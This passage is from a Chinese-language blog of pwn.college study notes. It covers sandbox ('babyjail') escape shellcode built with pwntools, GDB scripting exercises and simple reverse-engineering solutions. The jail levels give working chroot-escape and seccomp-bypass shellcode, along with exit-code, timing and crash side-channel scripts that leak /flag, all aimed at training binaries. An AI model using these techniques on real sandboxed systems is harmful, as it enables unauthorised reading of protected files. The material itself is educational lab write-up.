<h3 id="5-linkat"><a href="#5-linkat" class="headerlink" title="5. linkat"></a>5. linkat</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode = shellcraft.amd64.linkat(<span class="hljs-number">6</span>, <span class="hljs-string">&quot;flag&quot;</span>, <span class="hljs-string">&quot;AT_FDCWD&quot;</span>, <span class="hljs-string">&#x27;/f&#x27;</span>, <span class="hljs-number">0</span>)<br>shellcode+= shellcraft.amd64.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;f&quot;</span>, <span class="hljs-string">&quot;O_RDWR&quot;</span>)<br>shellcode+= shellcraft.amd64.sendfile(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;rax&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">128</span>)<br></code></pre></div></td></tr></table></figure>

<h3 id="6-fchdir"><a href="#6-fchdir" class="headerlink" title="6.fchdir"></a>6.fchdir</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode = shellcraft.amd64.fchdir(<span class="hljs-number">6</span>)                       <br>shellcode+= shellcraft.amd64.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag&quot;</span>, <span class="hljs-string">&quot;O_RDWR&quot;</span>)<br>shellcode+= shellcraft.amd64.sendfile(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;rax&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">128</span>)<br></code></pre></div></td></tr></table></figure>

<h3 id="7-没有at了"><a href="#7-没有at了" class="headerlink" title="7.没有at了"></a>7.没有at了</h3><p>允许的syscall:</p>
<figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim"><span class="hljs-keyword">chdir</span> (<span class="hljs-keyword">number</span> <span class="hljs-number">80</span>).<br>chroot (<span class="hljs-keyword">number</span> <span class="hljs-number">161</span>).<br><span class="hljs-built_in">mkdir</span> (<span class="hljs-keyword">number</span> <span class="hljs-number">83</span>).<br><span class="hljs-keyword">open</span> (<span class="hljs-keyword">number</span> <span class="hljs-number">2</span>).<br><span class="hljs-keyword">read</span> (<span class="hljs-keyword">number</span> <span class="hljs-number">0</span>).<br><span class="hljs-keyword">write</span> (<span class="hljs-keyword">number</span> <span class="hljs-number">1</span>).<br>sendfile (<span class="hljs-keyword">number</span> <span class="hljs-number">40</span>).<br></code></pre></div></td></tr></table></figure>

<p>使用再次chroot:</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode = shellcraft.amd64.mkdir(<span class="hljs-string">&quot;/temp&quot;</span>, <span class="hljs-number">0o777</span>)<br>shellcode+= shellcraft.amd64.chroot(<span class="hljs-string">&quot;/temp&quot;</span>)             <br>shellcode+= shellcraft.amd64.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;../../flag&quot;</span>, <span class="hljs-string">&quot;O_RDWR&quot;</span>)<br>shellcode+= shellcraft.amd64.sendfile(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;rax&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">128</span>)<br></code></pre></div></td></tr></table></figure>

<h3 id="8-openat-read-write-send"><a href="#8-openat-read-write-send" class="headerlink" title="8.openat read write send"></a>8.openat read write send</h3><p>感觉没什么特别的. 参数已经不限制输入flag了. 直接使用第三题的东西.</p>
<h3 id="9-变成32位"><a href="#9-变成32位" class="headerlink" title="9.变成32位"></a>9.变成32位</h3><p>syscall no: 3,4,5,6: <strong>close, stat, fstat, lstat.</strong> ???????????</p>
<p>哦对, 程序里的seccomp是通过SCMP_SYS() macro来add rule的, 然后又把arch设置成x86_32, 这样的话就是32位的read write open close这四个系统调用了. 而且没有chroot.</p>
<p>尝试使用pwntools遇到各种各样的问题.</p>
<ul>
<li>64和32代码是怎么切换的? int 0x80 and syscall吗?</li>
<li>int 0x80在64位模式下汇编, push最多DWORD. 不然operand mismatch.</li>
<li>字符串的地址只能使用汇编中的label, 栈上的地址仍然是64位的, 可能是因为过长导致open不能使用.</li>
<li>64位汇编肯定就不能用SYS_read这种了, 只能改成数字. </li>
</ul>
<p>精简如下(也没多精简):</p>
<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">/* open(file=&#x27;/flag&#x27;, oflag=&#x27;O_RDWR&#x27;, mode=0) */<br>/* push b&#x27;/flag\x00&#x27; */<br>lea ebx, [rip+flag]<br>mov ecx, 0x2<br>xor edx, edx<br>/* call open() */<br>mov eax, 5<br>int 0x80<br>/* read(fd=&#x27;eax&#x27;, buf=0x1337100, nbytes=0x99) */<br>mov ebx, eax<br>mov ecx, 0x1337100<br>mov rdx, 0x99<br>/* call read() */                               <br>push 3	/* 3 */<br>pop rax<br>int 0x80<br>/* write(fd=1, buf=0x1337100, n=0x32) */<br>mov ebx, 0x1<br>mov ecx, 0x1337100<br>mov rdx, 0x99<br>/* call write() */<br>mov eax, 4<br>int 0x80<br><br>flag:<br>    .ascii &quot;/flag&quot;<br>    .byte 0 #加不加没有区别, map上去的地址空间都是零<br></code></pre></div></td></tr></table></figure>

<h3 id="10-side-channel-communication"><a href="#10-side-channel-communication" class="headerlink" title="10.side channel communication"></a>10.side channel communication</h3><blockquote>
<p>都没有chroot了. 这题使用exit每次返回一字节.</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> glob <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;info&#x27;</span><br>binary = <span class="hljs-string">&quot;/challenge/babyjail_level10&quot;</span><br>context.binary = binary<br><br>ans = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">60</span>):<br>    shellcode =  <span class="hljs-string">&#x27;mov r8, rdx\nmov r9, r8\nadd r8, 0x100&#x27;</span><br>    shellcode += shellcraft.amd64.read(<span class="hljs-number">3</span>, <span class="hljs-string">&#x27;r8&#x27;</span>, <span class="hljs-number">0x100</span>)<br>    shellcode += <span class="hljs-string">&#x27;mov r10, [r8+&#x27;</span>+<span class="hljs-built_in">hex</span>(i)+<span class="hljs-string">&#x27;]\n&#x27;</span><br>    shellcode += shellcraft.amd64.exit(<span class="hljs-string">&#x27;r10&#x27;</span>)<br>    payload = asm(shellcode)<br>    p = process([binary, <span class="hljs-string">&#x27;/flag&#x27;</span>])<br>    p.sendline(payload)<br>    exitCode = p.poll(<span class="hljs-number">1</span>)                                   <br>    ans += <span class="hljs-built_in">chr</span>(exitCode)<br>    i += <span class="hljs-number">1</span><br><br><span class="hljs-built_in">print</span>(ans)<br></code></pre></div></td></tr></table></figure>

<h3 id="11-nanosleep"><a href="#11-nanosleep" class="headerlink" title="11.nanosleep"></a>11.nanosleep</h3><blockquote>
<p>这下子真的是bitwise的收集数据了</p>
</blockquote>
<p>遇到的几个问题:</p>
<ul>
<li>偶然会发生broken tube, 不知原因.</li>
<li>可以用字符串的format函数. </li>
<li>在pwn.college机子上timespec结构体两个成员都是<strong>八字节(包括long)</strong> </li>
<li>被网上抄来的32位程序nasm坑了一把, 现在是64位gas, 基本全改了……….</li>
<li>setnz是思维导图里看到突然想起来能用的. 以前整得笔记还不错.</li>
<li>直接使用label地址会有重定位条目, 必须使用rip来加上标签的偏移来在运行时确定准确的地址.</li>
<li>加载地址请用lea……line 15卡了十几分钟…..</li>
<li>视频中演示了time命令, 计算程序运行时间.</li>
<li>也可以直接写在栈上, 不用在汇编里写上这么一个数据结构.</li>
<li>如果把时间范围调大一点也能用时间来表示ascii码值, 也就是一次一字节. 应该更快.</li>
<li>视频使用了一个pwn.log.progress和process参数level, 这样子就不会有一堆打开关闭命令了.</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/bin/python</span><br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;info&#x27;</span><br>binary = <span class="hljs-string">&quot;/challenge/&quot;</span>+os.uname().nodename<br>context.binary = binary<br><br>bck1 = <span class="hljs-string">&#x27;mov r8, rdx\nmov r9, r8\nadd r8, 0x100\n&#x27;</span>+shellcraft.amd64.read(<span class="hljs-number">3</span>, <span class="hljs-string">&#x27;r8&#x27;</span>, <span class="hljs-number">0x100</span>)+<span class="hljs-string">&#x27;xor rcx, rcx\n&#x27;</span><br>bck2 = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    setnz cl</span><br><span class="hljs-string">    sal ecx, 4</span><br><span class="hljs-string">    mov [rip+tv_usec+3], cl</span><br><span class="hljs-string">    mov rax, 35</span><br><span class="hljs-string">    lea rdi, [rip+timeval]</span><br><span class="hljs-string">    mov rsi, 0</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    //经典非法指令,至少让我知道shellcode执行正常</span><br><span class="hljs-string">    .ascii &quot;\x0f\x04&quot; </span><br><span class="hljs-string">    timeval:</span><br><span class="hljs-string">    tv_sec:  .8byte 0</span><br><span class="hljs-string">    tv_usec: .8byte 0</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>ans = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">60</span>):<br>    char = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>        sc = bck1 <span class="hljs-comment">#这个就是对read的一个封装</span><br>        <span class="hljs-comment">#下面这个是取出一字节, 然后测试第j位是否为1</span><br>        sc += <span class="hljs-string">&#x27;mov cl, [r8+&#x27;</span>+<span class="hljs-built_in">hex</span>(i)+<span class="hljs-string">&#x27;]\ntest cl,&#x27;</span>+<span class="hljs-built_in">hex</span>(<span class="hljs-number">1</span>&lt;&lt;j)+<span class="hljs-string">&#x27;\n&#x27;</span><br>        sc += bck2	<br><span class="hljs-comment">#上面这个是nanosleep的调用封装,秒数由j位移位赋值到timespec结构体中第二个成员的第四个字节</span><br><span class="hljs-comment">#(从最低位开始, 因为是小端法存储),结果是268,435,456(1 0000|00000000|00000000|00000000)ns</span><br><span class="hljs-comment">#无sleep大概是0.05s,所以分界点为0.2s</span><br>        payload = asm(sc)<br>        start = time.time()<br>        p = process([binary, <span class="hljs-string">&#x27;/flag&#x27;</span>])<br>        p.sendline(payload)<br>        p.wait()<br>        end = time.time()<br>        elapse = end - start<br>        <span class="hljs-keyword">if</span> elapse &gt; <span class="hljs-number">0.2</span>:<br>            char |= <span class="hljs-number">1</span>&lt;&lt;j<br>    <span class="hljs-comment">#end for bits loop</span><br>    ans += <span class="hljs-built_in">chr</span>(char)<br><br><span class="hljs-built_in">print</span>(ans)<br></code></pre></div></td></tr></table></figure>

<h3 id="12-only-read"><a href="#12-only-read" class="headerlink" title="12.only read"></a>12.only read</h3><p>这次换成crash code就行了. <code>-4 </code>is <code>SIGILL</code>, <code>-11</code> is <code>SIGSEGV</code> </p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#一点小改动</span><br>bck2 = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">jnz isZero</span><br><span class="hljs-string">.ascii &quot;\x0f\x04&quot;</span><br><span class="hljs-string">isZero: .byte 0</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">if</span> p.poll(<span class="hljs-number">1</span>) == -<span class="hljs-number">4</span>:<br>    char |= mask<br></code></pre></div></td></tr></table></figure>

<h3 id="13-怎么是socket"><a href="#13-怎么是socket" class="headerlink" title="13.怎么是socket??"></a>13.怎么是socket??</h3><blockquote>
<p>use socketpair to the local communication </p>
<p>感觉没有任何限制啊, 就是构造一点父子进程间特有的命令.</p>
</blockquote>
<p>开始gdb refresher!!!!!</p>
<h1 id="module-6-gdb"><a href="#module-6-gdb" class="headerlink" title="module 6-gdb"></a>module 6-gdb</h1><p>GDB时间!</p>
<ul>
<li>info有好多东西. 看到一个<code>i proc m(appings)</code>, 不就是我上次用的<code>! cat /proc/pid/maps</code>么.</li>
<li> 一份超好看的<a target="_blank" rel="noopener" href="https://www.cs.umd.edu/class/spring2015/cmsc414/downloads/gdb-refcard.pdf">cheatsheet</a>!</li>
<li>pwndbg的<a target="_blank" rel="noopener" href="https://github.com/pwndbg/pwndbg/blob/dev/FEATURES.md">features</a> </li>
<li>神奇的教程网站, 视频是文字. <a target="_blank" rel="noopener" href="https://p.ost2.fyi/courses/course-v1:OpenSecurityTraining2+Dbg1012_GDB_1+2021_v1/course/">link</a> </li>
<li>三种gdb插件–gef(<a target="_blank" rel="noopener" href="https://demo.gef.blah.cat/">demo网站</a>|<a target="_blank" rel="noopener" href="https://gef.readthedocs.io/en/master/">doc</a>), 其他两个装好了. 还是peda安装简单, 还能整到pwncollege上. 再用一个插件我会混的….</li>
</ul>
<p>“Auto-loading safe path” section in the GDB manual.</p>
<p>前几题都没什么特别的, 就是一个refresher.</p>
<p>命令行选项: <code>/challenge/e* -x gdbscrip -q</code> </p>
<h3 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h3><p>居然要重复四次, 直接修改推导变量. 而且没有运行前加上断点会出错….原因待查.</p>
<h3 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h3><p>开始编写gdb脚本. 没有尝试过的东西, 马上开学.</p>
<p>查看gdb manual, <code>5.1.7 Breakpoint Command Lists</code>有提到一种特别的写法:</p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs jboss-cli">commands [list.<span class="hljs-string">..</span>]<br><span class="hljs-string">...</span> command-list <span class="hljs-string">...</span><br>end<br></code></pre></div></td></tr></table></figure>

<p>Any other command after a command that resumes execution will be ignored. </p>
<p>Can use <code>silent</code> to disable the printing of usual message when stopping at certain breakpoint. Usefull command for contolled output in <code>23.1.4 Commands for Controlled Output</code>, usually <code>echo, output, and printf</code> </p>
<p>You can also use breakpoint commands to compensate for one bug and test the other!</p>
<p><strong>e.g.</strong> </p>
<figure class="highlight arduino"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arduino"><span class="hljs-keyword">break</span> foo <span class="hljs-keyword">if</span> x&gt;<span class="hljs-number">0</span><br>commands<br>silent<br>printf <span class="hljs-string">&quot;x is %d\n&quot;</span>,x<br>cont<br>end<br></code></pre></div></td></tr></table></figure>

<p>好家伙, 每次地址都会变, 得换成相对地址. printf *($rbp-0x18)直接失败, 报attemp to dereferecing a generic pointer. 要想dereference指针得确定指针的类型, </p>
<p>先设断点然后再c(ontinue).</p>
<figure class="highlight llvm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs llvm">r                           <br>b *main+<span class="hljs-number">709</span><br>commands<br>    silent<br>    <span class="hljs-keyword">x</span>/gx $rbp<span class="hljs-number">-0</span><span class="hljs-keyword">x</span><span class="hljs-number">18</span><br>    set *(int*)($rbp<span class="hljs-number">-0</span><span class="hljs-keyword">x</span><span class="hljs-number">1</span><span class="hljs-keyword">c</span>)<span class="hljs-operator">=</span><span class="hljs-number">7</span><br>    <span class="hljs-keyword">c</span><br><span class="hljs-keyword">end</span><br><span class="hljs-keyword">c</span><br></code></pre></div></td></tr></table></figure>

<p>真正自己写起来问题怎么这么多……</p>
<h3 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h3><ul>
<li><p>全自动scrip. 在手册中的<code>23.1.3 Command Files</code>有介绍一些flow control command. 然后<code>5.1.3 Setting Catchpoints</code>也挺重要.</p>
</li>
<li><p>This time, try to write a script that doesn’t require you to ever talk to the program, and instead automatically solves each challenge by correctly <strong>modifying registers / memory.</strong> </p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.mengyibai.com/p/gdb-print-variables/">GDB: Printing Variables to File</a>, 不太好用, 毕竟是logging文件.</p>
</li>
<li><p>使用<code>printf</code>命令来写raw bytes到文件中.</p>
</li>
<li><p><code>commands</code>命令可以为断点添加命令.</p>
</li>
<li><p><code>ddb</code> – interactive kernel debugger</p>
</li>
</ul>
<p>如果要全自动, 我想到的思路是在read /dev/urandom的时候改成从stdin获取, 然后再gdb中使用<code>r &lt; tmp</code>来重定向. 后面的scanf也是从stdin获取, 这样的话就好办了. 为了测试conditionally perform gdb commands, 就不更改循环变量了.</p>
<p>历经挫折: </p>
<ul>
<li><del>把文件作为输入而且要多次输入, 每次文件指针都会向后移动的…..所以还是改变内存吧……</del>事实证明没有问题, 不过如果只是简单地&gt;=3会导致flag无法打开. 所以加上<code>4&lt;tmp</code>, if条件换成<code>if $rdi &gt;= 3 &amp;&amp; $rdi != 0x44</code>即可. </li>
<li>这个程序每次都会重新打开/dev/uramdom, 或许是因为新的随机数要重新打开???这样文件指针会大于等于3……</li>
<li>catch syscall会在syscall之前和之后调用, 所以设置好if语句就行…. (calls to and returns from system calls will be caught.)</li>
<li>还把==写成=, 绝</li>
<li>还发现了一个, 第六行按理来说已经跳到别的函数了, 毕竟read也只是glibc的封装, 但没注意到的是<code>__GI___libc_read()</code>这个函数根本没有<code>push rbp</code>,  <strong>所以当前栈帧没有变化</strong>.</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">r &lt;tmp<br>catch syscall read<br>commands<br>    silent<br>    if($rdi &gt;= 3 &amp;&amp; $rdi != 0x44)<br>        set *(int64_t*)($rbp-0x18) = 0x010203 # set ptr type<br>    end<br>    c<br>end<br><br>b *main+630 # stop at scanf()<br>commands<br>    silent<br>    set *(int64_t*)($rbp-0x10) = 0x010203<br>    c<br>end<br>c<br></code></pre></div></td></tr></table></figure>

<p>一个level能挣这么多东西出来…….</p>
<h3 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h3><p>直接一个<code>call (void*)win()</code>就结束了….</p>
<h1 id="module-7-rev"><a href="#module-7-rev" class="headerlink" title="module 7-rev"></a>module 7-rev</h1><ul>
<li>forword engineering vs. reverse engineering</li>
<li><code>cpp du strip strings</code> commands.</li>
<li>the most often we do is reversing the main modules.</li>
<li><code>fomit-frame-pointer</code> </li>
<li><a target="_blank" rel="noopener" href="https://cloud.binary.ninja/u/yogdzewa">cloud ninja</a> 用这个或者直接IDA就行. 都有IDA pro了其他的就随便试试.反正视频里是不可能说用盗版的:laughing: </li>
<li>把另一个checksec链接成了secheck, 功能似乎更多一点.</li>
<li>Open source:<ul>
<li><strong>angr management:</strong> an academic binary analysis framework! (<a target="_blank" rel="noopener" href="https://github.com/angr/angr-management/releases">github</a>) </li>
<li><strong>ghidra:</strong> a reversing tool created by the National Security Agency (<a target="_blank" rel="noopener" href="https://ghidra-sre.org/">https://ghidra-sre.org/</a>) </li>
<li><strong>cutter:</strong> a reversing tool created by the radare2 open source project (<a target="_blank" rel="noopener" href="https://cutter.re/">https://cutter.re/</a>) </li>
</ul>
</li>
<li>dynamic analysis: <ul>
<li>ltrace and strace </li>
<li>gdb<ul>
<li>context可以直接用display命令在每次停下来的时候模拟.</li>
</ul>
</li>
<li>Timeless Debugging<ul>
<li><strong>gdb</strong> has built-in record-replay functionality (<a target="_blank" rel="noopener" href="https://sourceware.org/gdb/onlinedocs/gdb/Reverse-Execution.html#Reverse-Execution">doc</a>)</li>
<li><strong>rr</strong> is a highly-performant record-replay engine (<a target="_blank" rel="noopener" href="https://github.com/mozilla/rr">github</a>) <a target="_blank" rel="noopener" href="https://github.com/rr-debugger/rr/wiki/Usage">doc</a> </li>
<li><strong>qira</strong> is a timeless debugger made for reverse engineering (<a target="_blank" rel="noopener" href="https://qira.me/">https://qira.me/</a>) </li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="level1-0-2-1"><a href="#level1-0-2-1" class="headerlink" title="level1.0-2.1"></a>level1.0-2.1</h3><p>没有什么特别, 但是2.1这个字符换位置的汇编值得注意:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">movzx   eax, byte ptr [rbp+buf]<br>mov     byte ptr [rbp+var_10], al<br>movzx   eax, byte ptr [rbp+buf+1]<br>mov     byte ptr [rbp+var_10+1], al<br>movzx   eax, byte ptr [rbp+var_10+1]<br>mov     byte ptr [rbp+buf], al<br>movzx   eax, byte ptr [rbp+var_10]<br>mov     byte ptr [rbp+buf+1], al<br></code></pre></div></td></tr></table></figure>

<h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><p>合着每关还有提示这关用了什么……</p>
<p>level3是reverse mangler.</p>
<h3 id="level4-1"><a href="#level4-1" class="headerlink" title="level4"></a>level4</h3><ul>
<li>IDA的汇编语法是使用的MASM(Microsoft Macro Assembler)的. <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/cpp/assembler/masm/directives-reference?view=msvc-170">这里</a>是一些directive. </li>
<li>IDA使用的high-level IL是IDC, 一个C-like language. 像什么<code>LOBYTE</code>在手册中有</li>
<li>一个<code>char buf[6]</code>被识别成了<code>int buf + int16_t v6</code>, 改一下buf的定义就成.</li>
<li>看了看IDA的一些操作.</li>
</ul>
<p>由于<code>biltw</code>是按照字母顺序排列, 所以一通操作之后没有变化.</p>
<h3 id="level5-1"><a href="#level5-1" class="headerlink" title="level5"></a>level5</h3><blockquote>
<p>This challenge is now mangling your input using the <code>xor</code> mangler with key <code>0xb2</code> </p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-built_in">list</span> = [<span class="hljs-number">0xFA</span>,<span class="hljs-number">0xF6</span>,<span class="hljs-number">0xEA</span>,<span class="hljs-number">0xF5</span>,<span class="hljs-number">0xF1</span>]<br><span class="hljs-built_in">print</span>([<span class="hljs-built_in">chr</span>(x^<span class="hljs-number">0x98</span>) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>])<br><br>[<span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&#x27;m&#x27;</span>, <span class="hljs-string">&#x27;i&#x27;</span>]<br></code></pre></div></td></tr></table></figure>

<p>好像简单过头了…</p>
<h3 id="level6-1"><a href="#level6-1" class="headerlink" title="level6"></a>level6</h3><blockquote>
<p>reverse + sort + xor</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;8f 8e 8e 8e 8c 82 81 87 86 84 9f 9e 9e 9e 93&quot;</span><br><span class="hljs-built_in">list</span> = <span class="hljs-built_in">str</span>.split(<span class="hljs-string">&quot; &quot;</span>)<br>list1 = [<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(x,<span class="hljs-number">16</span>)^<span class="hljs-number">0xeb</span>) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>]<br>list1.reverse()<br>res = <span class="hljs-string">&quot;&quot;</span>.join([x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> list1])<br><span class="hljs-built_in">print</span>(res)<br></code></pre></div></td></tr></table></figure>

<p>属于是python的练习使用</p>
<h3 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h3><blockquote>
<p>真特么复杂….还有<strong>不可见字符</strong>只能整成byte写到文件里.</p>
<p>好像挺简单, 但是又有点难(?</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;ff ff fe fc fb fb fb f7 f6 f6 f1 e7 e6 e1 e1 3c 3a 3a 38 37 32 32 20 2c 25 22 21 32 20&quot;</span><br><span 